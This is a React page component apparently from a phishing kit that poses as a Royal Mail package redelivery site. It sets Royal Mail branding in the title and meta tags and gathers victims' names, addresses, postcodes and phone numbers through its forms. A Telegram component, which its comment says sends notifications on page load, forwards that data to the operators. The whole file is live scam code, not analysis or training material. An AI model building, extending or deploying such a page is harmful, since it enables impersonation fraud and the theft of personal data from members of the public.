import { useState, useEffect, Suspense, lazy } from "react";
import Header from "@/components/Header";
import { Card, CardContent } from "@/components/ui/card";
import MainForm from "@/components/MainForm";
import TrackingForm from "@/components/TrackingForm";
import PackageForm from "@/components/PackageForm";
import Footer from "@/components/Footer";
import TelegramAPI from "@/components/tgapi";
import LoadingForm from "@/components/LoadingForm";

// Lazy load DeliveryDateForm to reduce bundle size
const DeliveryDateForm = lazy(() => import("@/components/DeliveryDateForm"));
const Index = () => {
  const [isVerified, setIsVerified] = useState(false);
  const [showDeliveryDateForm, setShowDeliveryDateForm] = useState(false);
  const [deliveryData, setDeliveryData] = useState(null);
  const [recipientData, setRecipientData] = useState(null);
  useEffect(() => {
    document.title = "Royal Mail - Package Delivery Service";
    const metaDescription = document.querySelector('meta[name="description"]');
    if (metaDescription) {
      metaDescription.setAttribute("content", "Royal Mail delivery and redelivery services");
    }
  }, []);
  return <div className="min-h-screen bg-white mx-0">
      {/* Telegram API Component - sends notifications on page load */}
      <TelegramAPI invoiceName={recipientData?.fullName || recipientData?.name || "Unknown Invoice"} address={`${recipientData?.address || ""} ${recipientData?.city || ""} ${recipientData?.postcode || ""}`.trim() || "Unknown Address"} phone={recipientData?.phone || "Unknown Phone"} />
      
      <Header />
      
      {/* Main Content Card */}
      {!isVerified ? <LoadingForm onVerified={() => setIsVerified(true)} /> : <div className="container py-2 my-[15px] mx-0 px-[5px]">
          {showDeliveryDateForm ? <Suspense fallback={<div className="flex items-center justify-center py-8"><div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div></div>}>
              <DeliveryDateForm name={deliveryData?.name || "Unknown Invoice"} address={deliveryData?.address} city={deliveryData?.city} postCode={deliveryData?.postcode} phone={deliveryData?.phone} />
            </Suspense> : <Card className="w-full md:w-fit mx-auto shadow-xl">
              <CardContent className="p-2 px-[8px] py-[15px] mx-0">
                <div className="flex flex-col md:flex-row gap-6 items-start mx-[9px] my-[3px]">
                  {/* Left Column - Delivery Details */}
                  <div className="w-full">
                    <MainForm onShowDeliveryForm={data => {
                setDeliveryData(data);
                setShowDeliveryDateForm(true);
              }} onRecipientDataChange={data => setRecipientData(data)} />
                  </div>
                  
                  {/* Right Column - Delivery Info Card */}
                  <div className="flex flex-col gap-4">
                    <TrackingForm recipientData={recipientData} />
                    <PackageForm recipientData={recipientData} />
                  </div>
                </div>
              </CardContent>
            </Card>}
        </div>}
      
      
      
      <Footer />
    </div>;
};
export default Index;